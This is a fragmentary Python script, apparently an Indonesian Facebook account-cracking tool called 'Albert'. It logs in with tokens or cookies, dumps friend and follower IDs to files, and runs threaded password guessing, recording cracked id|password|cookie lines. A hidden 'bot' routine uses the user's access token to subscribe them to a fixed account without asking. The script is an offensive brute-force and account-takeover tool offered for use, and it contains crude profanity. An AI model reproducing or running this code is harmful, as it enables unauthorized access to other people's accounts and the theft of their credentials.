...
os.system('xdg-open https://facebook.com/100000155545842/')
...
🇦‌🇱‌🇧‌🇪‌🇷‌🇹‌. 🇯‌🇷‌
             ...
             {m}•{k}•{h}•{sir} 𝘍𝘳𝘦𝘦 𝘛𝘰𝘰𝘭𝘴 {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t©©© extention sugestion : [green]Cookiedoufb[white] ©©©'))
		...
		print(f'  {x}[{h}•{x}]{h} Login Succesfull and please enter comand python{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s Login Unfeated, check it your account %s'%(x,k,x,m,x))
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100041225855500?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	...
	fb = 'https://www.facebook.com/orriagustina.silitonga'
	cetak(nel('\tHi Bro [yellow]%s[white] 😝'%(my_name)))
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'>> 1. result {h}OK{x} 😝 ')
	print(f'>> 2. result {k}CP{x} 😭 ')
	print('>> 3. back	')
	kz = input(f'\n>> Enter : ')
	if kz in ['2']:
...
def dump_massal():
	...
	try:
		...
		print(f'>>{k} error public friends {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
			...
			for cari in tes:
				...
				if 'mengajukan' in spl:
					...
					if idku in id:
						...
						print(f'\r	—Albert $> {x}({xy} %s {x}) <<———'%(len(id)), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
...
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/ALBERT-DUMP')
	except FileNotFoundError:
		print('>> file nothing ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan]•[white]] if u can use this tool\n[[green]1[white]] please create file dumper id\n[[green]2[white]] input your files in [yellow] ALBERT-DUMP[white] in internal your storage/sdcard \n[[green]3[white]] back to use feature input number[yellow] 4 [white]this '))
		kontol = input('\n>> your undrstand ( Y/t ) ')
		if kontol in ['']:
			print('>> Please Enter Valid Optionshh ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] ok your smart human🤣 ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] lol ')
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/ALBERT-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			print(f'{k}>> please valid enter bro {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/ALBERT-DUMP/'+geh,'r').read().splitlines()
		except:
...
#			id2.insert(xx,bacot)
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('')
	_jembot_ = input('>> add aplication ( Y/t ) ')
	if _jembot_ in ['']:
		print('>> please valid enter bro ')
		back()
		...
		taplikasi.append('no')
	pwplus=input('>> input Password Manual ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] input add password max 6 char\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Enjoy🙏 {m}•{k}•{h}•{x} <<<<< ')
	print('')
	print(f'>> crack {h}OK{x} Saving : {h}OK/%s {x}'%(okc))
	print(f'>> crack {k}CP{x} Saving : {k}CP/%s {x}'%(cpc))
	print(f'>> airplane mode to speed up{m}1k{x} Idz\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] Tools Finish[cyan] ✓[white] '))
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					print(f'\r{x}Albert $ {H}{idf}|{pw}|{kuki}{N}')
					...
					print(f'\r{x}Albert $ {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
					ok+=1
					break
